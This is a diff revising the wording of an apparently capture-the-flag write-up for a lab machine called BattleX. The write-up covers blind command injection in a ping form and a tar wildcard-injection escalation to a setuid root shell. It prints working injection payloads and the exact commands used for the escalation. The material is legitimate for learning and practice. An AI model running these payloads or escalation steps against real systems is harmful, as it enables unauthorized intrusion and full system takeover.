@@ -49,7 +49,7 @@ Login page bypassed and greeted by a ping system in /pingsystem.php .
 
 ![Imgur](https://i.imgur.com/lsA4hKP.png)
 
-This will likely be vulnerable to command injection, I just have to find a way to trigger the command injection. 
+This will likely be vulnerable to command injection, I just have to find a way to trigger it. 
 
 ![Imgur](https://i.imgur.com/tz2d93t.png)
 
@@ -59,7 +59,7 @@ My form data was
 127.0.0.1; sleep 5
 ```
 
-After several trials of several techniques of chaining commands, I found the one that works. 
+After several trials of techniques, I found the one that works. 
 
 ```
 127.0.0.1 `sleep 5`
@@ -69,7 +69,7 @@ The result didn't show, but the delay was sure executed by the system and I conc
 
 ### Exploiting 
 
-I proceeded to host a http server to get a result from my blind command injection. That way, it will be possible for me to get an insight of what's going on.
+I proceeded to host a http server to get a result from my blind command injection. That way, it will be easy for me to exploit the server.
 
 With some Python scripting and tweaking, I got an insight of the directory structure, current user and id
 
@@ -135,7 +135,7 @@ Sure, there's a user hacksparo in the system. I upgraded my shell to a python sp
 
 ![Imgur](https://i.imgur.com/1sGZp3s.png)
 
-I am user hacksparo, time to get flag. 
+I am hacksparo, time to get flag. 
 
 ```
 hacksparo@BattleX:~$ cat user.txt
@@ -165,14 +165,14 @@ hacksparo@BattleX:~$ cat /opt/backup/backup.sh
 
 sudo tar -cf backup.tar *
 ```
-I can't alter the file to change its content but I can only run the script. `tar` can be exploited to gain access. The exploit is known as wildcard injection. The process I took was this 
+I can't alter the script to change its content but I can only run it. `tar` can be exploited to gain access. The exploit I will be applying is known as wildcard injection.
 
 ```bash
 echo 'cp /bin/bash /home/hacksparo/bash; chmod +s /home/hacksparo/bash' > /home/hacksparo/shell.sh    
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 ```
-Running that and running `sudo /bin/bash /opt/backup/backup.sh` will copy bash from /bin/ directory to my current direcotry and set suid bit to it. 
+Running that and `sudo /bin/bash /opt/backup/backup.sh` will copy bash from /bin/ directory to my current direcotry and set suid bit to it. 
 
 ```
 hacksparo@BattleX:~$ echo 'cp /bin/bash /home/hacksparo/bash; chmod +s /home/hacksparo/bash' > /home/hacksparo/shell.sh
